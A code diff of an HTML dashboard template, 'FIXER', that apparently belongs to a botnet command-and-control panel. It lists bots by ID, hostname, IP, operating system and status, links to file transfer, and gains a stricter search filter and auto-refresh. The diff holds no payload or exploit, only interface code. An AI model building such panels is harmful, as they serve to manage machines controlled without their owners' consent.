@@ -1,236 +1,12 @@
- <!-- Dashboard.html -->
+<!-- Dashboard.html -->
 
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <link rel="shortcut icon" href="../static/Lion.png" type="image/png">
     <title>FIXER - Dashboard</title>
-    <style>
-        .sidebar {
-            height: 100%;
-            width: 220px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            background-color: #4caf50;
-            overflow-x: hidden;
-            padding-top: 10px;
-            text-align: left;
-        }
-        .sidebar a {
-            padding: 3px;
-            text-decoration: none;
-            font-size: 22px;
-            color: white;
-            display: flex;
-            align-items: center;
-            vertical-align: middle;
-        }
-        .sidebar img.avatar {
-            width: 25px;
-            margin-left: 10px;
-            align-items: center;
-            margin-bottom: 10px;
-            margin-right: 15px;
-            vertical-align: middle;
-        }
-        .sidebar img.logo {
-            margin-left: 10px;
-            width: 200px;
-            margin-bottom: 10px;
-        }
-        .sidebar h1 {
-            font-family: 'Impact', sans-serif;
-            font-weight: 500;
-            border: 1px solid white;
-            border-width: 2px;
-            border-radius: 10px;
-            padding: 5px;
-            font-size: 2em;
-            margin-left: 1px;
-            font-weight: 300;
-            line-height: 1em;
-            text-align: center;
-            color: #ba0000;
-        }
-        .sidebar a.selected {
-            background-color: #3a893e;
-        }
-        .sidebar a.logout {
-            background-color: #317334;
-        }
-        .sidebar a:hover {
-            background-color: #409744;
-        }
-        .content {
-            margin-left: 240px;
-            padding: 5px;
-            padding-top: 10px;
-            margin-top: 5px;
-        }
-        img {
-            display: block;
-        }
-        body {
-            font-family: 'Impact', sans-serif;
-            font-weight: 300;
-            line-height: 1.42em;
-            color: #A7A1AE;
-            background-color: #1F2739;
-        }
-        #just-line-break {
-            white-space: pre-line;
-        }
-        #line-break-and-tab {
-            white-space: pre-wrap;
-        }
-        .content {
-            margin-left: 200px;
-            margin-top: 10px;
-        }
-        .search-form {
-            margin-bottom: 20px;
-            text-align: center;
-            padding-left: 20px;
-        }
-        .search-form label {
-            font-size: 25px;
-            vertical-align: middle;
-            margin-right: 10px;
-            color: #FFF;
-        }
-        .search-form input[type="text"] {
-            padding: 8px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            margin-right: 10px;
-            width: 980px;
-        }
-        .search-form button {
-            padding: 8px 15px;
-            background-color: #4caf50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        .search-form button:hover {
-            background-color: #45a049;
-        }
-        h1 {
-            font-size: 3em;
-            font-weight: 300;
-            line-height: 1em;
-            text-align: center;
-            color: #4DC3FA;
-        }
-        h2 {
-            font-size: 1em;
-            font-weight: 300;
-            text-align: center;
-            display: block;
-            line-height: 1em;
-            padding-bottom: 2em;
-            color: #FB667A;
-        }
-        h2 a {
-            font-weight: 700;
-            text-transform: uppercase;
-            color: #FB667A;
-            text-decoration: none;
-        }
-        .blue {
-            color: #0075ab;
-        }
-        .yellow {
-            color: #FFF842;
-        }
-        .container th h1 {
-            font-weight: bold;
-            font-size: 18px;
-            text-align: center;
-            color: #FFF842;
-        }
-        .container td {
-            font-family: 'Impact', sans-serif;
-            font-weight: normal;
-            font-size: 1em;
-            text-align: center;
-            -webkit-box-shadow: 0 2px 2px -2px #0E1119;
-            -moz-box-shadow: 0 2px 2px -2px #0E1119;
-            box-shadow: 0 2px 2px -2px #0E1119;
-        }
-        .container {
-            text-align: left;
-            overflow: hidden;
-            width: 100%;
-            margin: 0 auto;
-            display: table;
-            padding: 0 0 8em 0;
-        }
-        .container td, .container th {
-            padding-bottom: 5px;
-            padding-top: 5px;
-        }
-        .container tr:nth-child(odd) {
-            background-color: #323C50;
-        }
-        .container tr:nth-child(even) {
-            background-color: #2C3446;
-        }
-        .container th {
-            background-color: #1F2739;
-        }
-        .container td:first-child {
-            color: #FB667A;
-        }
-        .container tr:hover {
-            background-color: #464A52;
-            -webkit-box-shadow: 0 4px 4px -4px #0E1119;
-            -moz-box-shadow: 0 4px 4px -4px #0E1119;
-            box-shadow: 0 4px 4px -4px #0E1119;
-        }
-        .container td:hover {
-            background-color: #FFF842;
-            color: #403E10;
-            font-weight: bold;
-            text-align: center;
-            box-shadow: #7F7C21 -1px 1px, #7F7C21 -2px 2px, #7F7C21 -3px 3px, #7F7C21 -4px 4px, #7F7C21 -5px 5px, #7F7C21 -6px 6px;
-            transform: translate3d(4px, -4px, 0);
-            transition-delay: 0s;
-            transition-duration: 0.35s;
-            transition-property: all;
-            transition-timing-function: line;
-        }
-        .search-form {
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .search-form label {
-            font-weight: bold;
-            margin-right: 10px;
-            color: #FFF;
-        }
-        .search-form input[type="text"] {
-            padding: 8px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            margin-right: 10px;
-        }
-        .search-form button {
-            padding: 8px 15px;
-            background-color: #4caf50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        .search-form button:hover {
-            background-color: #45a049;
-        }
-    </style>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
 </head>
 <body>
     <div class="sidebar">
@@ -244,21 +20,22 @@
         <a href="{{ url_for('file_transfer') }}"><img src="{{ url_for('static', filename='file_transfer_icon.png') }}" alt="File Transfer Icon" class="avatar"> File Transfer</a>
         <a href="{{ url_for('logout') }}" class="logout"><img src="{{ url_for('static', filename='logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
     </div>
-<div class="content">
     <div class="search-form">
-        <label for="botIdSearch">SEARCH BOT BY BOT-ID:</label>
-        <input type="text" id="botIdSearch" placeholder="Enter BOT ID">
-        <table align="center" class="container" id="botTable">
+        <label id="Search">SEARCH BOT BY BOT-ID:</label>
+        <input type="text" id="idNumber" placeholder="Enter BOT ID">
+    </div>
+    <div class="table">
+        <table class="table" id="botstable">
             <thead>
                 <tr>
-                    <th><h1>BOT-ID</h1></th>
-                    <th><h1>HOSTNAME</h1></th>
-                    <th><h1>IP ADDRESS</h1></th>
-                    <th><h1>OPERATING SYSTEM</h1></th>
-                    <th><h1>STATUS</h1></th>
+                    <th>BOT-ID</th>
+                    <th>HOSTNAME</th>
+                    <th>IP ADDRESS</th>
+                    <th>OPERATING SYSTEM</th>
+                    <th>STATUS</th>
                 </tr>
             </thead>
-            <tbody>
+            <tbody id="botstable-body">
                 {% for client in database %}
                     <tr>
                         <td>{{ client.idNumber }}</td>
@@ -271,28 +48,56 @@
             </tbody>
         </table>
     </div>
-</div>
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        const botTable = document.getElementById('botTable');
-        const botIdSearch = document.getElementById('botIdSearch');
-        function filterTable() {
-            const filterValue = botIdSearch.value.toLowerCase();
-            const rows = botTable.getElementsByTagName('tr');
-            for (let i = 0; i < rows.length; i++) {
-                const cell = rows[i].getElementsByTagName('td')[0];
-                if (cell) {
-                    const cellText = cell.textContent || cell.innerText;
-                    if (cellText.toLowerCase().indexOf(filterValue) > -1) {
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const botstableBody = document.getElementById('botstable-body');
+            const search = document.getElementById('idNumber');
+            let noMatchRow = null;
+            function filterTable() {
+                const filterValue = search.value.toLowerCase();
+                const rows = botstableBody.getElementsByTagName('tr');
+                if (filterValue === '') {
+                    for (let i = 0; i < rows.length; i++) {
                         rows[i].style.display = '';
-                    } else {
-                        rows[i].style.display = 'none';
+                    }
+                    if (noMatchRow) {
+                        botstableBody.removeChild(noMatchRow);
+                        noMatchRow = null;
+                    }
+                    return;
+                }
+                let found = false;
+                for (let i = 0; i < rows.length; i++) {
+                    const cells = rows[i].getElementsByTagName('td');
+                    for (let j = 0; j < cells.length; j++) {
+                        const cellText = cells[j].textContent || cells[j].innerText;
+                        if (cellText.toLowerCase() === filterValue) {
+                            found = true;
+                            for (let k = 0; k < rows.length; k++) {
+                                rows[k].style.display = 'none';
+                            }
+                            rows[i].style.display = '';
+                            break;
+                        }
                     }
                 }
+                if (!found) {
+                    for (let i = 0; i < rows.length; i++) {
+                        rows[i].style.display = 'none';
+                    }
+                    if (noMatchRow) {
+                        botstableBody.removeChild(noMatchRow);
+                    }
+                    noMatchRow = botstableBody.insertRow();
+                    const newCell = noMatchRow.insertCell();
+                    newCell.colSpan = 5;
+                    newCell.textContent = 'UNFORTUNATELY THE GIVEN BOT-ID DID NOT MATCH ANY BOT IDNMBER IN DATABASE';
+                    noMatchRow.style.display = '';
+                }
             }
-        }
-        botIdSearch.addEventListener('keyup', filterTable);
-    });
-</script>
+            search.addEventListener('input', filterTable);
+        });
+        setInterval(function () { window.location.href = window.location.origin + window.location.pathname; }, 30000);
+    </script>
 </body>
 </html>
